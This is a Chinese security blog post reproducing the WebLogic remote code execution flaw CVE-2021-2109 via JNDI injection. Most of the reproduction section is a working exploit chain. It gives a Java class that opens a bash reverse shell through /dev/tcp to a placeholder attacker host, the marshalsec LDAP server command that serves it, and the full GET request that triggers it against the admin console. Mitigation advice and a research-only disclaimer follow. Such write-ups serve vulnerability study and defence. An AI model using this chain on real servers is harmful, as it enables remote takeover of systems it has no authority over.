![1611205479_60090b671d7ba2d988185.jpg!small](https://image.3001.net/images/20210121/1611205479_60090b671d7ba2d988185.jpg!small)

CVE-2021-2109 Weblogic远程代码执行

## 一、漏洞简介

Oracle官方发布了漏洞补丁，修了包括 CVE-2021-2109 Weblogic
Server远程代码执行漏洞在内的多个高危严重漏洞。CVE-2021-2109 中，攻击者可构造恶意请求，造成JNDI注入，执行任意代码，从而控制服务器。

## 二、影响版本

WebLogic 10.3.6.0.0

WebLogic 12.1.3.0.0

WebLogic 12.2.1.3.0

WebLogic 12.2.1.4.0

WebLogic 14.1.1.0.0

## 三、漏洞复现

环境准备：WebLogic 10.3.6.0.0（win）

登陆后台：

![1611205479_60090b678bc39774b70d9.png!small](https://image.3001.net/images/20210121/1611205479_60090b678bc39774b70d9.png!small)

http://192.168.1.111:7001/console/login/LoginForm.jsp

![1611205480_60090b6860f5ed78cb3b2.png!small](https://image.3001.net/images/20210121/1611205480_60090b6860f5ed78cb3b2.png!small)

启动Ldap服务：

具体方法参考以前的fastjson方式：

[Fastjson1.2.47反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzIyNjk0ODYxMA==&mid=2247484025&idx=1&sn=10e26bbfd67f82b4c457601699d1f8eb&chksm=e869e114df1e6802491b516b03121304b35565bffe8ed8242214743b842897bd3e84673ba1e6&scene=21#wechat_redirect)

具体地址：https://mp.weixin.qq.com/s/69NCDDSaa07YY7DwyC9fgA

将下面exp保存为Exploit.java文件

import java.io.BufferedReader;import java.io.InputStream;import
java.io.InputStreamReader;public class Exploit{ public Exploit() throws
Exception { //Process p = Runtime.getRuntime().exec(new
String[]{"cmd","/c","calc.exe"}); Process p = Runtime.getRuntime().exec(new
String[]{"/bin/bash","-c","exec 5<>/dev/tcp/XXXXXX/34567;cat <&5 | while read
line; do $line 2>&5 >&amp5 done"}); InputStream is = p.getInputStream();
BufferedReader reader = new BufferedReader(new InputStreamReader(is)); String
line; while((line = reader.readLine()) != null) { System.out.println(line); }
p.waitFor(); is.close(); reader.close(); p.destroy(); } public static void
main(String[] args) throws Exception { }}

javac Exploit.java 编译生成Exploit.class文件

python启动web服务

python -m SimpleHTTPServer 1111

![1611205481_60090b69890452e63f627.png!small](https://image.3001.net/images/20210121/1611205481_60090b69890452e63f627.png!small)

通过python启动exphttp服务启动ldap服务(RMI服务)

本次复现使用ldap服务，同时也将RMI对应的操作也做了截图整理，主要是的原因的RMI的JDk版本支持，LDAPJava的版本本环境的支持（注意JDK的版本，这个是可能成功与否的关键）。

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar
marshalsec.jndi.LDAPRefServerhttp://XX.XX.XX.XX:1111/\\#Exploit 999

ldap抓包访问修改数据包

GET
/console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.1;100:389/exp;AdminServer%22)
HTTP/1.1Host: 192.168.1.111:7001User-Agent: Mozilla/5.0 (Macintosh; Intel Mac
OS X 10.15; rv:84.0) Gecko/20100101 Firefox/84.0Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer:
http://192.168.1.111:7001/console/login/LoginForm.jspConnection: closeCookie:
ADMINCONSOLESESSION=UXojCN1Oo-FkguAuuU35Z6tZ2-zmMUTskIjOizb35HOEcL6AwZCl!-2080081994;
JSESSIONID=sKsgWcOgre9zQdntt3QYv14IleXkZ94jW9vYYt4fEIOdNBaQtBeV!-1871779164Upgrade-Insecure-Requests: 1

POC:

GET
/console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.1;100:389/exp;AdminServer%22)
HTTP/1.1

执行成功效果

![1611205483_60090b6b8d8b35fe1cf58.png!small](https://image.3001.net/images/20210121/1611205483_60090b6b8d8b35fe1cf58.png!small)

具体的演示demo视频：https://mp.weixin.qq.com/s/nTfnRlAbAa7WjLsCBRx30g

## 四、安全建议

### 1、禁用T3协议

如果您不依赖T3协议进行JVM通信，可通过暂时阻断T3协议缓解此漏洞带来的影响

1). 进入Weblogic控制台，在base_domain配置页面中，进入“安全”选项卡页面，点击“筛选器”，配置筛选器。

2). 在连接筛选器中输入：weblogic.security.net.ConnectionFilterImpl，在连接筛选器规则框中输入：* * 7001
deny t3 t3s。

### 2、禁止启用IIOP

登陆Weblogic控制台，找到启用IIOP选项，取消勾选，重启生效

### 3、临时关闭后台/console/console.portal对外访问

### 4、升级官方安全补丁

## 参考：

https://xz.aliyun.com/t/9049

免责声明：本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![1611205484_60090b6c4c44becf1dad1.jpg!small](https://image.3001.net/images/20210121/1611205484_60090b6c4c44becf1dad1.jpg!small)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF主页：https://www.freebuf.com/author/thelostworld?type=article

![1611205484_60090b6c964bbdb5be622.png!small](https://image.3001.net/images/20210121/1611205484_60090b6c964bbdb5be622.png!small)

欢迎添加本公众号作者微信交流，添加时备注一下“公众号”

![1611205485_60090b6d02c57b68f8f6c.png!small](https://image.3001.net/images/20210121/1611205485_60090b6d02c57b68f8f6c.png!small)

  

